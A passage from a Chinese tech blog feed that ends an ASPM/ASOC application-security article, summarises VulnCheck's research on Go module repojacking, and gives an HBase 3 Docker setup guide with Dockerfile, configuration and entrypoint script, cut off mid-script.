title="增强的风险评分和管理"></a>增强的风险评分和管理</h3><p>ASPM旨在简化和集中数据源，从而相比ASOC提供更清晰和更深入的风险评分和管理能力。它既精确又全面，使组织能够根据漏洞的重要性和潜在影响来优先处理漏洞，从而更有效和高效地分配资源。</p><h3 id="工作流工具中的修复指南"><a href="#工作流工具中的修复指南" class="headerlink" title="工作流工具中的修复指南"></a>工作流工具中的修复指南</h3><p>在现代应用安全管理中，运营和生产力问题是一个重要关注点，特别是随着组织的发展。ASPM通过在修复方面采取主动措施，在工作流工具中提供深入的上下文信息和具体的修复指南来解决这个问题。这有助于DevSecOps团队节省时间，并使他们的安全工作与开发更无缝地对齐。</p><h3 id="强大的关联性"><a href="#强大的关联性" class="headerlink" title="强大的关联性"></a>强大的关联性</h3><p>ASPM通过分组关联和一对一发现简化了多个工具之间的安全发现关联。这简化了不同安全工具之间的关系，使安全团队能够摆脱安全问题的干扰，并快速评估漏洞和潜在威胁的影响。</p><h2 id="通过ASPM提升软件供应链安全性"><a href="#通过ASPM提升软件供应链安全性" class="headerlink" title="通过ASPM提升软件供应链安全性"></a>通过ASPM提升软件供应链安全性</h2><p>尽管ASOC是为了解决基于云的应用程序使用中出现的许多问题而开发的，但它并没有足够解决开发环境的复杂性、软件开发的安全需求和许多DevSecOps团队面临的操作挑战。</p><p>这导致了ASPM的崛起，它不仅仅是漏洞发现，而是上下文评估威胁，旨在从代码到云端集成到端到端的软件开发生命周期，并提供更实用的修复指南。简而言之，ASPM代表了应用安全的重大升级，其采用率只会继续增强。</p><p>目前国内现状是应用安全开发工具百家争鸣，百花齐放，但是没有一款可以调度编排大部分安全开发工具的平台，主要限制于安全开发意识薄弱、各家厂商工具接口不统一、漏洞评级标准不一，即便通过定制化把数据收集上来，也由于标准不统一，导致自动化分析效率低下。</p><p>应用安全开发，任重道远。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.legitsecurity.com/blog/unlocking-the-future-of-application-security-evolution-from-asoc-to-aspm">https://www.legitsecurity.com/blog/unlocking-the-future-of-application-security-evolution-from-asoc-to-aspm</a></p>]]></content>
    
    
    <categories>
      
      <category>Security</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SDL</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Go 模块库劫持 (repojacking) 介绍 from VulnCheck</title>
    <link href="/2023/12/11/2023-12-11-Hijackable-Go-Module-Repositories/"/>
    <url>/2023/12/11/2023-12-11-Hijackable-Go-Module-Repositories/</url>
    
    <content type="html"><![CDATA[<h1 id="Go-模块库劫持-repojacking-介绍-from-VulnCheck"><a href="#Go-模块库劫持-repojacking-介绍-from-VulnCheck" class="headerlink" title="Go 模块库劫持 (repojacking) 介绍 from VulnCheck"></a>Go 模块库劫持 (repojacking) 介绍 from VulnCheck</h1><hr><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>VulnCheck是一家漏洞情报初创公司，今天在浏览VulnCheck博客时发现一篇文章：Hijackable Go Module Repositories，对于Go 模块库劫持的漏洞原理讲解十分清晰明了，以下内容大部分来源于原文博客，个人只做整理，分析和总结。</p><p>VulnCheck 分析了 Go 模块生态系统，寻找其源代码存储库可能容易受到存储库劫持（repojacking）的模块。由于 GitHub 用户名更改，超过 9,000 个存储库容易受到重新劫持。VulnCheck 发现超过 6,000 个存储库由于帐户删除而容易受到重新劫持。这 15000 个存储库加起来支持超过 800000 个 Go 模块。</p><h2 id="为什么-Go-特别容易受到存储库劫持（repojacking）"><a href="#为什么-Go-特别容易受到存储库劫持（repojacking）" class="headerlink" title="为什么 Go 特别容易受到存储库劫持（repojacking）"></a>为什么 Go 特别容易受到存储库劫持（repojacking）</h2><p>Go 模块生态系统是去中心化设计的，是独一无二的。其他打包系统（例如 Pypi 或 NPM）要求开发人员创建帐户才能上传其包。这使得软件包平台能够管理用户和内容。Go语言比较特殊，Go 开发人员通过将代码推送到 GitHub 等源代码控制平台来发布模块。然后任何人都可以从软件源获取 Go 模块和 pkg.go.dev 缓存模块的详细信息。<br>这种去中心化使得 Go 模块存储库特别容易受到重新劫持。当模块作者更改其用户名或删除其帐户时，存储库就会变得容易受到攻击。此时，攻击者可以注册新未使用的用户名，复制模块存储库，并将新模块发布到 proxy.golang.org 和 go.pkg.dev 。<br>GitHub 确实有一些针对重新劫持的保护措施，受欢迎的仓库命名空间回退功能可以防止任何仓库“在所有者的帐户被重命名或删除之前的一周内有超过100个克隆”的再劫持。这听起来可能很合理，但对于 Go 来说却不一定。 Go 模块通常由 Module 镜像缓存，因此不需要与源存储库交互或从源存储库克隆。对于某些情况，在 GitHub 上托管了一个开源库，我们每天都使用它，并且有 170 多个星，但该存储库在上周只看到了 20 个克隆。基于此，100 个克隆的保护并不一定像 GitHub 想象的那么好。</p><h2 id="寻找可劫持的-Go-模块"><a href="#寻找可劫持的-Go-模块" class="headerlink" title="寻找可劫持的 Go 模块"></a>寻找可劫持的 Go 模块</h2><p>2023 年 6 月，Aquasec 发表了研究报告，指出数百万个可劫持的 GitHub 存储库。了解到 Go 特别容易受到这种攻击向量的影响，我们开始准确枚举有多少 Go 模块版本可能受到影响。模块版本是指一个模块及其所有版本。<br>跟踪超过 2000 万个 Go 模块版本。它不完全是一个小数据集，但追踪可重复劫持模块的算法相对简单：</p><ol><li>对于每个模块，从模块名称推断存储库 URL。例如， github.com&#x2F;vulncheck-oss&#x2F;go-exploit 是一个Go模块，其源代码托管在<a href="https://github.com/vulncheck-oss/go-exploit%E3%80%82">https://github.com/vulncheck-oss/go-exploit。</a></li><li>尝试连接到每个存储库。</li><li>HTTP 301 响应表示用户名更改、存储库名称更改或两者兼而有之。出于我们的目的，我们验证了存储库名称是否相同（例如 go-exploit ），但用户名已更改。我们还验证了原始用户帐户（例如 vulncheck-oss ）不存在。这进一步消除了存储库传输之类的东西。通过所有这些步骤的存储库被认为可能容易受到重新劫持。</li><li>HTTP 404 响应表明存储库不再存在。然后我们将查看用户名是否仍然存在。如果不是，那么这也可能容易受到重新劫持。</li><li>HTTP 200 响应表明存储库不易受到攻击。</li><li>然后我们验证了潜在可劫持的存储库实际上在 go.pkg.dev 中有一个条目（您可以使用模块镜像缓存几乎所有内容，因此清除非 Go 模块内容非常重要）。<br>剩下的就是大量可以被重新劫持的存储库（假设过去 7 天问题中的 100 个克隆不是问题）。我们的第一个发现是，由于用户名更改，超过 9,000 个 Go 模块 GitHub 存储库容易受到重新劫持。潜在的重新劫持会影响超过 500,000 个 Go 模块版本。<br>为了确定存储库的受欢迎程度，我们获取了每个存储库的 GitHub 星数。我们以 0 到 1000 的桶形式绘制了结果。按星号分组的可劫持 Go 模块存储库统计图如下:</li></ol><p><img src="/img/20231211-01.png" alt="可劫持 Go 模块存储库统计图"></p><p>大多数存储库的星级为零。这些对于攻击者来说几乎没有价值。其余 3,000 个存储库的星级在 1 到 1000 之间。存储库对攻击者有价值的可能性随着星级的增加而增加，但仅靠星级并不能说明攻击有多有用。 Go 生态系统中的实际使用很重要，因为利用依赖于开发人员更新到新模块。<br>我们跟踪的另一个类别是可劫持的存储库，因为 GitHub 帐户已被删除。我们发现了超过 6,000 个此类存储库，最终影响了近 300,000 个模块版本。由于存储库已被删除，我们无法找到它们有多少颗星。攻击者必须依赖于查找使用模式 - 最终搜索代码的导入。<br><img src="/img/20231211-02.png" alt="搜索代码导入"><br>这是一个沉重的负担，但对于合适的攻击者来说是值得的。尽管如此，即使在野外找到用途也是不够的。最终，受害者将需要更新到攻击者的新模块，因为攻击者无法覆盖旧模块。因此，尽管威胁确实存在，但 Go 生态系统内的重新劫持对于攻击者来说并不是立竿见影的胜利。</p><h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><p>VulnCheck认为缓解重新劫持漏洞是 Go 或 GitHub 必须承担的任务，这个和禅道创始人王春生前段时间分享了一个开源协议在中国面临的 bug：开源软件许可协议通常会表明作者不对用户使用该开源软件所造成的任何问题负责，但是，这种条款，在中国，是违法的观点类似。这个观点博主不做置评，对于重劫持漏洞，博主个人观点则认为github只是一个代码托管的平台，应提供更为灵活的重劫持保护措施，责任方应由go官方来负责和承担。在那之前，Go 开发人员应了解他们使用的模块以及这些模块源自的存储库的状态非常重要。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://vulncheck.com/blog/go-repojacking">https://vulncheck.com/blog/go-repojacking</a>【go-repojacking】</li></ul>]]></content>
    
    
    <categories>
      
      <category>Security</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Supply Chain</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>在docker中安装hbase-3(本地模式)</title>
    <link href="/2023/11/21/2023-11-21-install-hbase-by-docker/"/>
    <url>/2023/11/21/2023-11-21-install-hbase-by-docker/</url>
    
    <content type="html"><![CDATA[<h1 id="在docker中安装hbase-3-本地模式"><a href="#在docker中安装hbase-3-本地模式" class="headerlink" title="在docker中安装hbase-3(本地模式)"></a>在docker中安装hbase-3(本地模式)</h1><hr><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>最近在处理数据，传统的模式已经无法支撑千万级的任务分析和存储，被迫得升级一下当前的技术栈，为了方便和易于部署(图省事)，构造hbase-3(本地模式)容器来继研究学习。</p><h2 id="构造hbase容器"><a href="#构造hbase容器" class="headerlink" title="构造hbase容器"></a>构造hbase容器</h2><p>参考harisekhon&#x2F;hbase的脚本以及配置文件，结合hbase最新版本特征，重新修改的配置文件和脚本目录树如下：<br><img src="/img/20231121-01.png" alt="hbase容器目录"></p><h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><h4 id="Dockerfile"><a href="#Dockerfile" class="headerlink" title="Dockerfile"></a>Dockerfile</h4><p>其中，Dockerfile如下：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> harisekhon/alpine-java:jre8<br><br><span class="hljs-keyword">ARG</span> HBASE_VERSION=<span class="hljs-number">3.0</span>.<span class="hljs-number">0</span>-alpha-<span class="hljs-number">4</span><br><br><span class="hljs-keyword">ENV</span> PATH $PATH:/hbase/bin<br><br><span class="hljs-keyword">ENV</span> JAVA_HOME=/usr<br><br><span class="hljs-keyword">WORKDIR</span><span class="language-bash"> / </span><br><br><span class="hljs-comment"># bash - needed for entrypoint.sh</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> apk add --no-cache bash</span><br><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">set</span> -eux &amp;&amp; \</span><br><span class="language-bash">    apk add --no-cache wget tar &amp;&amp; \</span><br><span class="language-bash">    url=<span class="hljs-string">&quot;http://www.apache.org/dyn/closer.lua?filename=hbase/<span class="hljs-variable">$HBASE_VERSION</span>/hbase-<span class="hljs-variable">$HBASE_VERSION</span>-bin.tar.gz&amp;action=download&quot;</span>; \</span><br><span class="language-bash">    url_archive=<span class="hljs-string">&quot;http://archive.apache.org/dist/hbase/<span class="hljs-variable">$HBASE_VERSION</span>/hbase-<span class="hljs-variable">$HBASE_VERSION</span>-bin.tar.gz&quot;</span>; \</span><br><span class="language-bash">    wget -t 10 --max-redirect 1 --retry-connrefused -O <span class="hljs-string">&quot;hbase-<span class="hljs-variable">$HBASE_VERSION</span>-bin.tar.gz&quot;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$url</span>&quot;</span> || \</span><br><span class="language-bash">    wget -t 10 --max-redirect 1 --retry-connrefused -O <span class="hljs-string">&quot;hbase-<span class="hljs-variable">$HBASE_VERSION</span>-bin.tar.gz&quot;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$url_archive</span>&quot;</span> &amp;&amp; \</span><br><span class="language-bash">    <span class="hljs-built_in">mkdir</span> <span class="hljs-string">&quot;hbase-<span class="hljs-variable">$HBASE_VERSION</span>&quot;</span> &amp;&amp; \</span><br><span class="language-bash">    tar zxf <span class="hljs-string">&quot;hbase-<span class="hljs-variable">$HBASE_VERSION</span>-bin.tar.gz&quot;</span> -C <span class="hljs-string">&quot;hbase-<span class="hljs-variable">$HBASE_VERSION</span>&quot;</span> --strip 1 &amp;&amp; \</span><br><span class="language-bash">    <span class="hljs-built_in">test</span> -d <span class="hljs-string">&quot;hbase-<span class="hljs-variable">$HBASE_VERSION</span>&quot;</span> &amp;&amp; \</span><br><span class="language-bash">    <span class="hljs-built_in">ln</span> -sv <span class="hljs-string">&quot;hbase-<span class="hljs-variable">$HBASE_VERSION</span>&quot;</span> hbase &amp;&amp; \</span><br><span class="language-bash">    <span class="hljs-built_in">rm</span> -fv <span class="hljs-string">&quot;hbase-<span class="hljs-variable">$HBASE_VERSION</span>-bin.tar.gz&quot;</span> &amp;&amp; \</span><br><span class="language-bash">    <span class="hljs-built_in">rm</span> -rf hbase/docs hbase/src &amp;&amp; \</span><br><span class="language-bash">    <span class="hljs-built_in">mkdir</span> /hbase-data &amp;&amp; \</span><br><span class="language-bash">    apk del tar wget</span><br><br><span class="hljs-comment"># Needed for HBase 2.0+ hbase-shell</span><br><span class="hljs-comment"># asciidoctor solves &#x27;NotImplementedError: fstat unimplemented unsupported or native support failed to load&#x27;</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> bash -c <span class="hljs-string">&#x27; \</span></span><br><span class="hljs-string"><span class="language-bash">    set -euxo pipefail &amp;&amp; \</span></span><br><span class="hljs-string"><span class="language-bash">    apk add --no-cache jruby jruby-irb asciidoctor &amp;&amp; \</span></span><br><span class="hljs-string"><span class="language-bash">    echo exit | hbase shell \</span></span><br><span class="hljs-string"><span class="language-bash">    # jruby-maven jruby-minitest jruby-rdoc jruby-rake jruby-testunit &amp;&amp; \</span></span><br><span class="hljs-string"><span class="language-bash">    &#x27;</span></span><br><br><span class="hljs-keyword">VOLUME</span><span class="language-bash"> /hbase-data</span><br><br><span class="hljs-keyword">COPY</span><span class="language-bash"> entrypoint.sh /</span><br><span class="hljs-keyword">COPY</span><span class="language-bash"> conf/hbase-site.xml /hbase/conf/</span><br><br><span class="hljs-comment"># Stargate  8080  / 8085</span><br><span class="hljs-comment"># Thrift    9090  / 9095</span><br><span class="hljs-comment"># HMaster   16000 / 16010</span><br><span class="hljs-comment"># RS        16201 / 16301</span><br><span class="hljs-keyword">EXPOSE</span> <span class="hljs-number">2181</span> <span class="hljs-number">8080</span> <span class="hljs-number">8085</span> <span class="hljs-number">9090</span> <span class="hljs-number">9095</span> <span class="hljs-number">16000</span> <span class="hljs-number">16010</span> <span class="hljs-number">16030</span> <span class="hljs-number">16201</span> <span class="hljs-number">16301</span><br><br><span class="hljs-keyword">ENTRYPOINT</span><span class="language-bash"> [<span class="hljs-string">&quot;/entrypoint.sh&quot;</span>]</span><br></code></pre></td></tr></table></figure><p>Dockerfile说明：<br>如果觉得harisekhon&#x2F;alpine-java:jre8比较陈旧，可以自行编译构建，参考：alpine-java</p><h4 id="hbase-site-xml"><a href="#hbase-site-xml" class="headerlink" title="hbase-site.xml"></a>hbase-site.xml</h4><p>conf&#x2F;hbase-site.xml 配置如下:</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="language-xml"><span class="hljs-meta">&lt;?xml-stylesheet type=<span class="hljs-string">&quot;text/xsl&quot;</span> href=<span class="hljs-string">&quot;configuration.xsl&quot;</span>?&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;<span class="hljs-name">property</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>hbase.cluster.distributed<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;<span class="hljs-name">property</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>hbase.rootdir<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>/hbase-data<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;<span class="hljs-name">property</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>hbase.zookeeper.quorum<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>zookeeper:2181<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;<span class="hljs-name">property</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>hbase.tmp.dir<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>$</span><span class="hljs-template-variable">&#123;env.HBASE_HOME:-.&#125;</span><span class="language-xml">/tmp<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;<span class="hljs-name">property</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>hbase.unsafe.stream.capability.enforce<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>false<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span></span><br><span class="language-xml"></span><br></code></pre></td></tr></table></figure><p>hbase-site.xml 配置说明：<br>这个配置文件主要是针对本地模式进行修改的，并不适配集群。</p><h4 id="docker-compose-yaml"><a href="#docker-compose-yaml" class="headerlink" title="docker-compose.yaml"></a>docker-compose.yaml</h4><p>docker-compose.yaml 如下：</p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">version</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&#x27;3&#x27;</span><br><br><span class="hljs-attribute">services</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">hbase</span><span class="hljs-punctuation">:</span><br>        <span class="hljs-attribute">image</span><span class="hljs-punctuation">:</span> <span class="hljs-string">hksanduo/hbase:3.0.0-alpha-4</span><br>        <span class="hljs-attribute">container_name</span><span class="hljs-punctuation">:</span> <span class="hljs-string">hbase</span><br>        <span class="hljs-attribute">hostname</span><span class="hljs-punctuation">:</span> <span class="hljs-string">master</span><br>        <span class="hljs-attribute">restart</span><span class="hljs-punctuation">:</span> <span class="hljs-string">always</span><br>        <span class="hljs-attribute">logging</span><span class="hljs-punctuation">:</span><br>          <span class="hljs-attribute">driver</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;json-file&quot;</span><br>          <span class="hljs-attribute">options</span><span class="hljs-punctuation">:</span><br>            <span class="hljs-attribute">max-size</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;500m&quot;</span><br>        <span class="hljs-attribute">ports</span><span class="hljs-punctuation">:</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-string">2181:2181</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-string">8080:8080</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-string">8085:8085</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-string">9090:9090</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-string">9095:9095</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-string">16000:16000</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-string">16010:16010</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-string">16020:16020</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-string">16030:16030</span><br>        <span class="hljs-attribute">volumes</span><span class="hljs-punctuation">:</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-string">./hbase-data:/hbase-data</span><br>        <span class="hljs-attribute">environment</span><span class="hljs-punctuation">:</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-string">TZ=Asia/Shanghai</span><br>        <span class="hljs-attribute">privileged</span><span class="hljs-punctuation">:</span> <span class="hljs-string">true</span><br><br></code></pre></td></tr></table></figure><p>这里将当前目录的hbase-data目录进行映射，做到数据持久化。</p><h4 id="entrypoint-sh"><a href="#entrypoint-sh" class="headerlink" title="entrypoint.sh"></a>entrypoint.sh</h4><p>entrypoint.sh 如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/usr/bin/env bash</span><br><br><span class="hljs-built_in">set</span> -x<br><span class="hljs-built_in">set</span> -euo pipefail<br>[ -n <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;DEBUG:-&#125;</span>&quot;</span> ] &amp;&amp; <span class="hljs-built_in">set</span> -x<br><br><br><span class="hljs-built_in">export</span> HBASE_HOME=<span class="hljs-string">&quot;/hbase&quot;</span><br><span class="hljs-built_in">export</span> JAVA_HOME=<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;JAVA_HOME:-/usr&#125;</span>&quot;</span><br><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;================================================================================&quot;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;                              HBase Docker Container&quot;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;================================================================================&quot;</span><br><span class="hljs-built_in">echo</span><br><span class="hljs-comment"># shell breaks and doesn&#x27;t run zookeeper without this</span><br><span class="hljs-built_in">mkdir</span> -pv <span class="hljs-string">&quot;<span class="hljs-variable">$HBASE_HOME</span>/logs&quot;</span><br><br><span class="hljs-function"><span class="hljs-title">start_zookeeper</span></span>()&#123;<br>    <span class="hljs-comment"># tries to run zookeepers.sh distributed via SSH, run zookeeper manually instead now</span><br>    <span class="hljs-comment">#RUN sed -i &#x27;s/# export HBASE_MANAGES_ZK=true/export HBASE_MANAGES_ZK=true/&#x27; &quot;$HBASE_HOME/conf/hbase-env.sh&quot;</span><br>    <span class="hljs-built_in">echo</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Starting Zookeeper...&quot;</span><br>    <span class="hljs-string">&quot;<span class="hljs-variable">$HBASE_HOME</span>/bin/hbase&quot;</span> zookeeper &amp;&gt;<span class="hljs-string">&quot;<span class="hljs-variable">$HBASE_HOME</span>/logs/zookeeper.log&quot;</span> &amp;<br>    <span class="hljs-built_in">echo</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-title">start_master</span></span>()&#123;<br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Starting HBase Master...&quot;</span><br>    <span class="hljs-string">&quot;<span class="hljs-variable">$HBASE_HOME</span>/bin/hbase-daemon.sh&quot;</span> start master<br>    <span class="hljs-built_in">echo</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-title">start_regionserver</span></span>()&#123;<br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Starting HBase RegionServer...&quot;</span><br>    <span class="hljs-comment"># HBase versions &lt; 1.0 fail to start RegionServer without SSH being installed</span><br>    <span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;<span class="hljs-subst">$(echo /hbase-* | sed &#x27;s,/hbase-,,&#x27; | cut -c 1)</span>&quot;</span> = 0 ]; <span 